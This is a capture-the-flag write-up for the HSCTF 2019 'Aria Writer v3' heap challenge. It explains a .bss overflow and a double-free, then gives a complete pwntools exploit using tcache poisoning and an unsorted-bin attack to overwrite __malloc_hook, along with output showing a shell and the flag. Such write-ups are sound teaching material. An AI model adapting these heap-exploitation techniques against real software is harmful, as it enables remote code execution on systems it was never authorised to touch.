[Pwn - 468] Aria Writer v3 (25 solves)
======


[binary](https://sturmisch.github.io/assets/2019/hsctf/ariav3/) and [libc](https://sturmisch.github.io/assets/2019/hsctf/ariav3/libc-2.27.so) file



### Analysis

We're given a binary and a libc file:
```
$ file aria-writer-v3; checksec aria-writer-v3
aria-writer-v3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=8224829cd041248a25bd3d5e73b163f6be89bb3d, not stripped
[*] '/home/tempest/CTF/2019/hsctf/pwn/ariav3/aria-writer-v3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



When we run this binary it shows a heap-like menu:
```
./aria-writer-v3 
whats your name > ?
hi ?!
?! rob needs your help composing an aria 
1) write something 
2) throw it away 
Gimme int pls >
```



We can only allocate heap chunk with size up to 0x1a4 (pseudocode is omitted for sake of brevity):
```C
if(note_counter > 256) abort();
...
size = get_int();
if(size > 0x1a4) abort();
++note_counter;
curr = (char *)malloc(size);
read(0,curr,size);
```
`curr` is a `char *` located in `.bss` section. Basically, we can only have one note allocated at a time.



There are two vulnerabilities in this binary, one is overflow in `.bss` section:
```C
...
printf("whats your name > ");
fgets(name,0xe8,stdin);
...
```
name is declared as `char name[0xa0]`. We can overwrite note counter located below name variable.



The second vulnerability is UAF and double free in delete path:
```C
...
puts("ok that letter was bad anyways...");
free(curr);
...
```



In libc 2.26, tcache is introduced in order to optimize `malloc`'s allocation. Security check is not added, not until libc 2.28. We can treat chunk with size below 0x410 as fastbin (above, largebin). However, tcache can only store up to 7 heap chunks before reverting back to it's original fastbins and smallbins (same as 2.23). We're going to use [tcache poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c) in order to leak libc address and [unsorted bin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c) to gain RCE.



### Exploitation

First, we're asked a name. We can use this to put two fake size header (0x150 and 0x80) for later use, and overwrite note counter to INT_MIN. Then, we use double free to write fake prev size and size (0x80), again for later use. 
```
gef> tel 0x602048 24
0x0000000000602048|+0x0000: 0x0000000000000161 -> fake size
0x0000000000602050|+0x0008: 0x0000000000000000
...
0x00000000006020d0|+0x0088: 0x0000000000000090 -> fake prev size
0x00000000006020d8|+0x0090: 0x0000000000000091 -> fake size
0x00000000006020e0|+0x0098: 0x0000000000000000
0x00000000006020e8|+0x00a0: 0x0000000000001337
0x00000000006020f0|+0x00a8: 0x0000000000000420
0x00000000006020f8|+0x00b0: 0x0000000080000000 -> note counter = INT_MIN
...
0x0000000000602160|+0x0118: 0x0000000000000090 -> fake prev size
0x0000000000602168|+0x0120: 0x0000000000000091 -> fake size
```



We allocate our chunk at name+8 using double free, and double free is again triggered (this time with 0x150 as our chunk's size). next we change the size from the fake chunk with double free to 0x91:
```
gef> tel 0x602048 2
0x0000000000602048|+0x0000: 0x0000000000000091
0x0000000000602050|+0x0008: 0x0000000000602050
```



We proceed to fill the tcache entry for 0x80 chunk by freeing the chunk 7 times, and putting the chunk in unsorted bin. Here is where the fake 0x90 prev size and size comes in; `malloc` checks whether the next chunk and two next chunk is a valid chunk with valid prev size or not. The caveat here is that we can't print the note nor name's content. We can do `unsorted bin attack` by double freeing and allocating at the bk of freed chunk. The next smallbin allocation will populate the chunk with main arena ptr:
```
gef> tel 0x602050 2
0x0000000000602050|+0x0000: 0x0000155555326d20 -> 0x0000155555326d10 -> 0x0000155555326d00 -> 0x0000155555326cf0 -> 0x0000155555326ce0 -> 0x0000155555326cd0 -> 0x0000155555326cc0
0x0000000000602058|+0x0008: 0x0000000000602040 -> 0x0000000000602058
```



Last step is to bruteforce the allocation to `__malloc_hook` since we can't leak anything.
```
gef> p &__malloc_hook
$1 = (void *(**)(size_t, const void *)) 0x155555326c30 <__malloc_hook>
```
A partial overwrite with 0x6c30 should do it. It should take several attempt to successfully land a chunk.



full exploit code:
```Python
#!/usr/bin/python

from pwn import *

def allocate(size,payload):
	r.sendlineafter("> ",'1')
	r.sendlineafter("> ","{:d}".format(size))
	r.sendafter("> ",payload)

def free():
	r.sendlineafter("> ",'2')

def write(size,where,what):
	allocate(size,'?'*8)
	free()
	free()
	allocate(size,p64(where))
	allocate(size,'?'*8)
	allocate(size,what)

def exploit():
	log.info("faking chunk metadatas (0x150 & 0x80)")
	log.info("overwriting n_notes with INT_MIN")
	payload = p64(0x161)
	payload = payload.ljust(0x88,'\x00')
	payload += p64(0x90)
	payload += p64(0x91)
	payload += p64(0)
	payload += p64(0x1337)
	payload += p64(0x420)
	payload += p64(0x80000000) # INT_MIN
	r.sendlineafter("> ",payload)

	log.info("setup malloc")
	allocate(0x30,'a'*8)

	log.info("faking 0x90 size and prev size")
	payload = p64(0)*2
	payload += p64(0x90)
	payload += p64(0x91)
	write(0x30,0x602048+0x90+0x90-0x18,payload)

	log.info("double freeing 0x602050 with size of 0x150")
	write(0x100,0x602050,p64(0))
	free()
	free()

	log.info("setting 0x602050 size to 0x80")
	write(0x40,0x602048,p64(0x91))

	write(0x50,0x602050,'b'*8)

	log.info("filling 0x80 tcache entry")
	for i in xrange(7): free()
	log.info("putting 0x80 chunk to unsorted bin")
	free()

	log.info("overwriting bk to trigger unsorted bin attack")
	write(0x110,0x602058,p64(0x602050-0x10))

	log.info("populating 0x602050 with main arena ptr")
	allocate(0x80,p16(0x6c30))
	
	log.info("bruteforcing 4 bit to land 0x150 chunk on __malloc_hook")
	allocate(0x150,p16(0x6c30))
	allocate(0x150,p64(exe.symbols["win"]))

	log.warning("shell should've popped by now...")
	r.sendlineafter("> ",'1')
	r.sendlineafter("> ",'1')

	r.interactive()

# context.log_level = "debug"
exe = ELF("./aria-writer-v3")
libc = exe.libc

if len(sys.argv) < 2:
	r = process(exe.path,aslr=False)
	gdb.attach(r,"""
		b *0x400a3c
		b *0x400a86
		# b *execve
		c
	""")
else:
	r = remote("pwn.hsctf.com",2468)

exploit()
```



Output:
```
tempest@tempestuous:~/CTF/2019/hsctf/pwn/ariav3$ python exploit.py go
[*] '/home/tempest/CTF/2019/hsctf/pwn/ariav3/aria-writer-v3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.hsctf.com on port 2468: Done
[*] faking chunk metadatas (0x150 & 0x80)
[*] overwriting n_notes with INT_MIN
[*] setup malloc
[*] faking 0x90 size and prev size
[*] double freeing 0x602050 with size of 0x150
[*] setting 0x602050 size to 0x80
[*] filling 0x80 tcache entry
[*] putting 0x80 chunk to unsorted bin
[*] overwriting bk to trigger unsorted bin attack
[*] populating 0x602050 with main arena ptr
[*] bruteforcing 4 bit to land 0x150 chunk on __malloc_hook
[!] shell should've popped by now...
[*] Switching to interactive mode
$ ls
aria-writer-v3
bin
dev
flag
lib
lib32
lib64
$ cat flag
hsctf{i_wish_tho_:(_0a0d098213}
$ exit
what should i write tho > $ 
[*] Closed connection to pwn.hsctf.com port 2468
```